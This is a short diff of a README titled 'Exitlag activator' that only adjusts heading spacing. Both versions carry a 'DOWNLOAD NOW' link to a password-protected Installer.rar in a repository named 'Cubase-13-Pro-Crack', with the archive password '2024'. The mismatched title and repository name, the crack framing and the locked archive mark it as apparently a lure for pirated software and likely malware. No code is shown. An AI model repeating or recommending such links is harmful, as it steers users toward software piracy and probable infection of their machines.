@@ -1,7 +1,7 @@
 # Exitlag activator
-##[DOWNLOAD NOW](https://github.com/Fairydx/Cubase-13-Pro-Crack/releases/download/release/Installer.rar)
+## [DOWNLOAD NOW](https://github.com/Fairydx/Cubase-13-Pro-Crack/releases/download/release/Installer.rar)
 
-##Pass : 2024
+## Pass : 2024
 
 
 
